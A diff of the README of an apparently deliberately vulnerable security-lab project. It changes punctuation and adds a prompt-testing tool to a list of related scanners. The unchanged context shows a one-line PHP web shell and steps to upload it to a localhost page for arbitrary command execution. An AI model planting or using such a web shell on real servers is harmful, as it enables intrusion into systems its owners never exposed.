@@ -84,7 +84,7 @@ Expected output: **10 passed, 0 failed**
 
 1. Save a file named `shell.php` with content: `<?php system($_GET["c"]); ?>`
 2. Upload it at http://localhost:8081/upload.php
-3. Visit http://localhost:8081/uploads/shell.php?c=id — arbitrary command execution
+3. Visit http://localhost:8081/uploads/shell.php?c=id - arbitrary command execution
 
 ## Automated security scan
 
@@ -107,6 +107,7 @@ See report/SECURITY-REPORT.md - a real pentest-style report with CVSS scores, Po
 | 🔐 JWT Analyzer | CLI (Python) | [Repo](https://github.com/ElhamBidarigh/jwt-analyzer) |
 | 🔍 Active Scanner | Live URL scanner (PHP) | [Repo](https://github.com/ElhamBidarigh/securAI-active-scanner) |
 | 🔌 MCP Scanner | CLI (Python) | [Repo](https://github.com/ElhamBidarigh/securAI-mcp-scanner) |
+| 🧪 Prompt Tester | CLI (Python) | [Repo](https://github.com/ElhamBidarigh/securAI-prompt-tester) |
 
 ## Tech stack
 
@@ -117,4 +118,4 @@ See report/SECURITY-REPORT.md - a real pentest-style report with CVSS scores, Po
 
 ## License
 
-MIT — for educational use only.
+MIT - for educational use only.
